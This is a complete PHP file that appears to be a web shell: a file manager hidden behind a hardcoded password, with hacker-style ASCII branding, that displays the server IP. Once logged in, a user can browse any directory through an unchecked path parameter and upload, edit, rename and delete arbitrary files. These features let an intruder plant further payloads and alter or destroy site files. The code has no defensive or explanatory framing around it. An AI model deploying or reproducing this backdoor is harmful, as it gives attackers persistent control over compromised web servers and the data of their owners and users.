<?php
session_start();

$password = "Pwdnx1337";
$server_ip = !empty($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());

if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['pass'])) {
        if ($_POST['pass'] === $password) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "wrong password!";
        }
    }
    ?>
<!DOCTYPE html>
<html>
<head>
    <title>login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background:#111; 
            color:#fff; 
            font-family:monospace; 
            margin:0; 
            height:100vh; 
            display:flex; 
            align-items:center; 
            justify-content:center; 
        }
        .login-container {
            text-align:center;
        }
        input[type=password], input[type=submit] {
            padding:6px;
            margin:7px;
            border:none;
            font-size:10px;
            border-radius:5px;
        }
        input[type=password] { width:200px; }
        input[type=submit] { background:#333; color:#fff; cursor:pointer; }
        input[type=submit]:hover { background:#444; }
    </style>
</head>
<body>
    <div class="login-container">
        <?php if(!empty($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <form method="post">
            <input type="password" name="pass" placeholder="password"><br>
            <input type="submit" value="login">
        </form>
    </div>
</body>
</html>
    <?php
    exit;
}

function list_dir($dir) {
    $files = scandir($dir);
    $dirs = $fls = array();
    foreach ($files as $file) {
        if ($file === ".") continue;
        if (is_dir($dir . "/" . $file)) {
            $dirs[] = $file;
        } else {
            $fls[] = $file;
        }
    }
    sort($dirs);
    sort($fls);
    return array_merge($dirs, $fls);
}

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir);

if (isset($_FILES['upload'])) {
    $target = $current_dir . "/" . basename($_FILES['upload']['name']);
    $msg = move_uploaded_file($_FILES['upload']['tmp_name'], $target) ? "upload success." : "upload failed.";
}

if (isset($_GET['delete'])) {
    $target = $current_dir . "/" . $_GET['delete'];
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
    $msg = "deleted successfully";
}

if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    file_put_contents($current_dir . "/" . $_POST['edit_file'], $_POST['file_content']);
    $msg = "file saved";
}

if (isset($_POST['saveRename'])) {
    $from = $current_dir . "/" . $_POST['rename_from'];
    $to   = $current_dir . "/" . $_POST['rename_to'];
    $msg = rename($from, $to) ? "rename success." : "rename failed.";
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>file manager</title>
    <style>
        body { background:#111; color:#fff; font-family:monospace; }
        a, a:visited { color: #0f0; text-decoration: none; }
        a:hover { text-decoration: underline; }
        a.btn {
            background: #040; color: #afa; padding: 5px 10px;
            border: 1px solid #080; text-decoration: none;
            margin-left: 3px; display: inline-block; border-radius: 3px;
        }
        a.btn:hover { background: #080; }

        a.btn.rename {
            background: #222;
            color: #fff;
            border: 1px solid #444;
        }
        a.btn.rename:hover {
            background: #444;
        }
        table { width:100%; border-collapse:collapse; }
        th, td { border-bottom:1px solid #444; padding:6px; }
        th { text-align:center; }
        td.nama { text-align:left; }
        td.size { text-align:center; }
        td.aksi { text-align:right; }
        form { display:inline; }
        input[type=text], input[type=file], textarea {
            background:#222; color:#fff; border:1px solid #444; padding:5px;
        }
        input[type=submit], button {
            background:#222; color:#fff; border:1px solid #444;
            padding:5px 10px; cursor:pointer; margin-left: 3px;
        }
        input[type=submit]:hover, button:hover { background:#444; }
        .msg { background:#222; padding:5px; margin:5px 0; }
        .ascii-art {
            font-family: monospace; white-space: pre; text-align: center;
            color: #0f0; margin: 40px auto; user-select: none; line-height: 1.1em;
        }
        .path-bar {
            margin-top: 10px;
            font-size: 14px;
        }
        .path-label, .path-sep {
            color: #888;
        }
        .path-part {
            color: #fff;
        }
        .path-part a {
            color: #fff;
            text-decoration: none;
        }
        .path-part a:hover {
            text-decoration: underline;
        }

        tr:hover td {
            background: rgba(255, 255, 255, 0.08);
        }
    </style>
</head>
<body>

<div class="ascii-art">
██████╗░░██╗░░░░░░░██╗██████╗░███╗░░██╗██╗░░██╗
██╔══██╗░██║░░██╗░░██║██╔══██╗████╗░██║╚██╗██╔╝
██████╔╝░╚██╗████╗██╔╝██║░░██║██╔██╗██║░╚███╔╝░
██╔═══╝░░░████╔═████║░██║░░██║██║╚████║░██╔██╗░
██║░░░░░░░╚██╔╝░╚██╔╝░██████╔╝██║░╚███║██╔╝╚██╗
╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═════╝░╚═╝░░╚══╝╚═╝░░╚═╝
</div>

<?php if(!empty($msg)) echo "<div class='msg'>$msg</div>"; ?>

<div style="display:flex;justify-content:space-between;align-items:center;">
    <div>
        <form method="post" enctype="multipart/form-data" style="margin:0;">
            <input type="file" name="upload">
            <input type="submit" value="upload">
        </form>
        <!-- path navigator -->
        <div class="path-bar">
            <span class="path-label">cwd:</span>
            <?php
            $parts = explode(DIRECTORY_SEPARATOR, trim($current_dir, DIRECTORY_SEPARATOR));
            $build = DIRECTORY_SEPARATOR;
            foreach ($parts as $i => $part) {
                $build .= $part;
                echo ' <span class="path-sep">/</span> <span class="path-part"><a href="?dir=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a></span>';
                $build .= DIRECTORY_SEPARATOR;
            }
            ?>
        </div>
    </div>
    <div style="text-align:right; white-space:nowrap;">
        server ip: <?php echo htmlspecialchars($server_ip, ENT_QUOTES, 'UTF-8'); ?>
    </div>
</div>
<hr>

<?php
if (isset($_GET['rename'])) {
    $oldName = basename($_GET['rename']);
    ?>
    <h3>rename file: <?php echo htmlspecialchars($oldName); ?></h3>
    <form method="post">
        <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($oldName); ?>">
        <input type="text" name="rename_to" value="<?php echo htmlspecialchars($oldName); ?>" required>
        <br><br>
        <input type="submit" name="saveRename" value="save">
        <a href="<?php echo $_SERVER['PHP_SELF']; ?>"><button type="button">cancel</button></a>
    </form>
    <?php
    exit;
}
?>

<table>
    <tr>
        <th>name</th>
        <th>size</th>
        <th>actions</th>
    </tr>
    <?php
    foreach (list_dir($current_dir) as $file) {
        $full_path = $current_dir . "/" . $file;
        echo "<tr>";
        if (is_dir($full_path)) {
            echo "<td class='nama'><a href='?dir=".urlencode($full_path)."'>[dir] $file</a></td>";
            echo "<td class='size'>-</td>";
        } else {
            echo "<td class='nama'>$file</td>";
            echo "<td class='size'>" . filesize($full_path) . " bytes</td>";
        }
        echo "<td class='aksi'>";
        echo "<a href='?rename=".urlencode($file)."' class='btn rename'>rename</a> ";
        if (!is_dir($full_path)) {
            echo "<a href='?dir=".urlencode($current_dir)."&edit=".urlencode($file)."' class='btn'>edit</a> ";
        }
        echo "<a href='?dir=".urlencode($current_dir)."&delete=".urlencode($file)."' onclick='return confirm(\"delete?\")' class='btn'>delete</a>";
        echo "</td>";
        echo "</tr>";
    }
    ?>
</table>

<?php if (isset($_GET['edit'])): ?>
    <?php $editFile = $current_dir . "/" . $_GET['edit']; ?>
    <h3>edit file: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
    <form method="post">
        <textarea name="file_content" style="width:100%;height:300px;"><?php echo htmlspecialchars(file_get_contents($editFile)); ?></textarea>
        <br>
        <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
        <input type="submit" value="save">
        <a href="<?php echo $_SERVER['PHP_SELF']; ?>"><button type="button">cancel</button></a>
    </form>
<?php endif; ?>

</body>
</html>
